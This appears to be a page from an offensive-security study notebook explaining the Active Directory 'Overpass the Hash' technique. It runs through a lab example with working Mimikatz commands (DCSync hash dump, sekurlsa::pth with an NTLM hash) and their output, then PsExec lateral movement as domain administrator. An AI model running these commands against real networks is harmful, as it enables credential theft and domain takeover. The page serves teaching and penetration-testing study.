---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Overpass The Hash

[Overpassing the Hash](https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf) is similar in concept to passing the hash but it takes things a step further. It uses the compromised password hash to obtain a valid Kerberos TGT for the user. This allows authentication to any service the user has access to. Also because the attacker has the user's password hash this technique will work _even if Kerberos Pre-Authentication is enabled_.

[Recall](../authentication/#operation-details) the steps for authentication with Kerberos:

1. Client encrypts a timestamp with the user's password hash and sends it the KDC (domain controller in AD)
   * If pre-authentication is disabled, instead of encrypting a timestamp a simple clear-text request is sent
2. KDC validates timestamp and returns an AS-REP which consists of two messages
   1. Session Key (encrypted with user's password hash)
   2. TGT (encrypted with session key)

Assuming one has access to the password hash of a user it is possible to extract the TGT. When the AS-REP is received the session key can be extracted by decrypting with the user's password hash. Then the TGT message can be decrypted and the TGT stored for later use. Keep in mind the TGT can only be used from the machine for which it was created. E.g. if a TGT is created on `CLIENT74`, it cannot be exported and then used on say `CLIENT75`.&#x20;

## Example Background

The example will be very similar to the one seen in the [pass the hash](pass-the-hash.md) section. Assume the attacker was able to carry out a [DC Sync attack](../authentication/attacking-ad-authentication/dc-sync.md) and thus was able to gain access to any user's hashed password. This example will use the domain administrator account `corp\Administrator`:

```shell-session
mimikatz # lsadump::dcsync /user:corp\Administrator
...
Credentials:
  Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
...
```

The hash is copied below for convenience:

```
2892d26cdf84d7a70e2eb3b9f05c425e
```

## Mimikatz

Mimikatz has a `serkurlsa::pth` command. While the name implies it is doing simple PtH, it is in fact overpassing the hash and generating a TGT.

Assuming the attacker has Admin access to a machine they can run Mimikatz then, after running `privilege::debug`, use the `sekurlsa::pth` command to conduct the attack. The command structure is:

{% code overflow="wrap" %}
```
sekurlsa::pth /user:Administrator /domain:corp.com /ntlm:2892d26cdf84d7a70e2eb3b9f05c425e
```
{% endcode %}

* Optionally a `/run` parameter may be included to specify a process to create. E.g. `/run:powershell` would launch a PowerShell session. Omitting this parameter defaults to opening a `cmd.exe` prompt&#x20;

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::pth /user:Administrator /domain:corp.com /ntlm:2892d26cdf84d7a70e2eb3b9f05c425e
user    : Administrator
domain  : corp.com
program : cmd.exe
impers. : no
NTLM    : 2892d26cdf84d7a70e2eb3b9f05c425e
  |  PID  1116
  |  TID  6024
  |  LSA Process is now R/W
  |  LUID 0 ; 2132538 (00000000:00208a3a)
  \_ msv1_0   - data copy @ 000001940FC24450 : OK !
  \_ kerberos - data copy @ 000001940FC9D4A8
   \_ des_cbc_md4       -> null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 000001940FD60AA8 (32) -> null
```

When run, a new command prompt opens with the generated TGT integrated. At this point, running the `whoami` command on the newly created PowerShell session would show the identity of the user who launched Mimikatz instead of `corp\Administrator`. While this could be confusing, this is the intended behavior of the `whoami` utility which only checks the current process's token and does not inspect any imported Kerberos tickets.

The newly created terminal can then be used to do anything the user has permissions for. For example, one could use it to run things like [`PsExec`](psexec.md) to open a command session to the desired target:

```shell-session
C:\Tools>.\PsExec64.exe \\FILES04 cmd.exe

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>hostname
FILES04

C:\Windows\system32>whoami
corp\administrator
```

If the attacker uses the opened prompt to do anything that would generate a Kerberos TGS they can then use the `klist` command to see the tickets (including the stolen TGT).
